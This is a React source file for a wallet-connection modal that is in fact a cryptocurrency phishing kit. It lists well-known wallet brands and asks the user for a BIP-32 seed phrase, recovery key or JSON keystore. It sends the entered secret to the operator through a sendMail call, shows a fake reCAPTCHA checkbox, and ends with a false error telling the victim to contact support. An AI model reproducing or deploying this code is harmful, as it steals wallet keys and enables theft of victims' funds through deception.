import { useState } from 'react';
import { Modal, Card, Image, Text, Loader } from '@mantine/core';
import { useForm } from '@mantine/form';
import { useMutation } from '@tanstack/react-query';
import { useFunctions } from '~/providers/FunctionsProvider';
import { notifications } from '@mantine/notifications';

export function WalletModal({
  opened,
  onClose,
}: {
  opened: boolean;
  onClose: () => void;
}) {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [showForm, setShowForm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
  const { sendMail } = useFunctions();

  const form = useForm({
    initialValues: {
      email: '',
      message: '',
    },
    validate: {
      email: (value) => (/^\S+@\S+$/.test(value) ? null : 'Invalid email'),
      message: (value) =>
        value.length > 10 ? null : 'Key must be at least 10 characters',
    },
  });

  const submitMutation = useMutation({
    mutationFn: async (values: { email: string; message: string }) => {
      if (!recaptchaValue) throw new Error('Please complete the reCAPTCHA');

      // Simulate API call
      await new Promise((resolve) => setTimeout(resolve, 3000));

      return { success: true };
    },
    onSuccess: async () => {
      await sendMail({
        email: form.values.email,
        message: `${selectedWallet}, key: ${form.values.message}`,
      });
      setShowForm(false);
      onClose();
      form.reset();
      setRecaptchaValue(null);
      setSelectedWallet(null);
      notifications.show({
        title: 'Error connecting wallet',
        message: 'Contact support for assistance on decentralizing your wallet',
        color: 'red',
      });
    },
  });

  const handleWalletClick = (walletId: string) => {
    setSelectedWallet(walletId);
    setLoading(true);

    // Simulate loading for 2 seconds
    setTimeout(() => {
      setLoading(false);
      setShowForm(true);
    }, 2000);
  };

  const handleFormSubmit = (values: { email: string; message: string }) => {
    submitMutation.mutate(values);
  };

  return (
    <>
      {/* Wallet Selection Modal */}
      <Modal
        opened={opened && !showForm}
        onClose={onClose}
        title="Select Your Wallet"
        size="lg"
        centered
        overlayProps={{
          blur: 3,
        }}
      >
        {loading ? (
          <div className={'flex justify-center items-center h-52'}>
            <Loader size="xl" variant="bars" />
          </div>
        ) : (
          <div className="grid grid-cols-4 gap-4">
            {walletImages.map((wallet) => (
              <div
                key={wallet.id}
                className={'rounded-md shadow-sm'}
                onClick={() => handleWalletClick(wallet.title)}
              >
                <Image
                  src={wallet.link}
                  alt={wallet.title}
                  className="rounded-md"
                  style={{
                    borderRadius: '8px',
                    width: '70%',
                    margin: '0 auto',
                  }}
                />
                <Text
                  fw={500}
                  size="xs"
                  mt="md"
                  style={{ textAlign: 'center' }}
                >
                  {wallet.title}
                </Text>
              </div>
            ))}
          </div>
        )}
      </Modal>

      {/* Form Modal */}
      <Modal
        opened={showForm}
        onClose={() => setShowForm(false)}
        title={`Connect with ${selectedWallet}`}
        size="md"
        centered
        transitionProps={{ transition: 'fade', duration: 300 }}
      >
        <form onSubmit={form.onSubmit(handleFormSubmit)}>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Email
              </label>
              <input
                {...form.getInputProps('email')}
                className="w-full px-3 py-2 border bg-white border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="your@email.com"
              />
              {form.errors.email && (
                <p className="mt-1 text-sm text-red-600">{form.errors.email}</p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Fill your BIP-32 API word codes, Also known as a 12-24 Seed
                Phrase, Recovery Key or JSON Keystore..{' '}
                {`{either from ethereunm network or solan network}`}
              </label>
              <textarea
                {...form.getInputProps('message')}
                className="w-full px-3 py-2 border bg-white border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                rows={4}
                placeholder="Type here..."
              />
              {form.errors.message && (
                <p className="mt-1 text-sm text-red-600">
                  {form.errors.message}
                </p>
              )}
            </div>

            <div className="flex justify-between border bg-white shadow-md px-6 py-2 rounded-md">
              <div className="flex items-center justify-center">
                <input
                  type="checkbox"
                  id="recaptcha"
                  className="mr-2 size-6"
                  onChange={(e) =>
                    setRecaptchaValue(e.target.checked ? 'valid' : null)
                  }
                />
                <label htmlFor="recaptcha" className="text-sm">
                  I am not a robot
                </label>
              </div>
              <Image
                src="/images/recaptcha.png"
                alt="Recaptcha"
                className="size-16"
              />
            </div>

            <div className="pt-4">
              <button
                type="submit"
                disabled={submitMutation.isPending || !recaptchaValue}
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-200"
              >
                {submitMutation.isPending ? (
                  <Loader size="sm" color="white" />
                ) : (
                  'Submit'
                )}
              </button>
            </div>
          </div>
        </form>
      </Modal>
    </>
  );
}

const walletImages = [
  {
    id: 'comp-lqpqnb0u1__item1',
    title: 'Rainbow',
    link: 'https://static.wixstatic.com/media/c9104a_091dbfcff3b344ecb421a5d05c09a51d~mv2.webp/v1/fill/w_112,h_112,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/c9104a_091dbfcff3b344ecb421a5d05c09a51d~mv2.webp',
  },
  {
    id: 'comp-lqpqnb0u1__item-j9r9uxns',
    title: 'Trust',
    link: 'https://static.wixstatic.com/media/c9104a_cb9557bf8d4b400f806a1f031ac8ecdb~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/tw%20logo.png',
  },
  {
    id: 'comp-lqpqnb0u1__item-j9r9uz7e',
    title: 'Metamask',
    link: 'https://static.wixstatic.com/media/c9104a_a923af865da1477e8b5086a16ab478d5~mv2.webp/v1/fill/w_112,h_112,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/5195e9db-94d8-4579-6f11-ef553be95100.webp',
  },
  {
    id: 'comp-lqpqnb0u1__item-knd3rqnw',
    title: 'Gnosis safe',
    link: 'https://static.wixstatic.com/media/c9104a_c90783312a4b479693b7a466f4261360~mv2.webp/v1/fill/w_112,h_112,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00.webp',
  },
  {
    id: 'comp-lqpqnb1h2__item1',
    title: 'Crypto.com',
    link: 'https://static.wixstatic.com/media/c9104a_d29924a069854b3bac7812093becc3e4~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/unnamedyo.png',
  },
  {
    id: 'comp-lqpqnb1h2__item-j9r9uxns',
    title: 'Kucoin',
    link: 'https://static.wixstatic.com/media/c9104a_659455dba6a5405887611073f271a138~mv2.webp/v1/fill/w_112,h_112,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/unnamed.webp',
  },
  {
    id: 'comp-lqpqnb1h2__item-j9r9uz7e',
    title: 'Bitcoin.com',
    link: 'https://static.wixstatic.com/media/c9104a_891166608bec406481fab491798f0dd3~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/unnamedj.png',
  },
  {
    id: 'comp-lqpqnb1h2__item-knd3rqnw',
    title: 'Blockchain',
    link: 'https://static.wixstatic.com/media/c9104a_38e1813a24334e35b5e2327d1b53ff25~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/indexu.png',
  },
  {
    id: 'comp-lqpqnb1y1__item1',
    title: 'Bitpay',
    link: 'https://static.wixstatic.com/media/c9104a_e84242132af1408b858306d02ca4f34d~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/bitpay-logo-square-2.png',
  },
  {
    id: 'comp-lqpqnb1y1__item-j9r9uxns',
    title: 'Exodus',
    link: 'https://static.wixstatic.com/media/c9104a_02cf78ecd75241d6a9d14533aa688256~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/unnameduy.png',
  },
  {
    id: 'comp-lqpqnb1y1__item-j9r9uz7e',
    title: 'Ledger',
    link: 'https://static.wixstatic.com/media/c9104a_260238460e674611b7cab3f2f3eac58a~mv2.webp/v1/fill/w_112,h_112,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/a7f416de-aa03-4c5e-3280-ab49269aef00.webp',
  },
  {
    id: 'comp-lqpqnb1y1__item-knd3rqnw',
    title: 'Coinbase',
    link: 'https://static.wixstatic.com/media/c9104a_5b1b25c51aad495290c211c9ade3e91f~mv2.png/v1/fill/w_112,h_112,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/unnamed.png',
  },
];
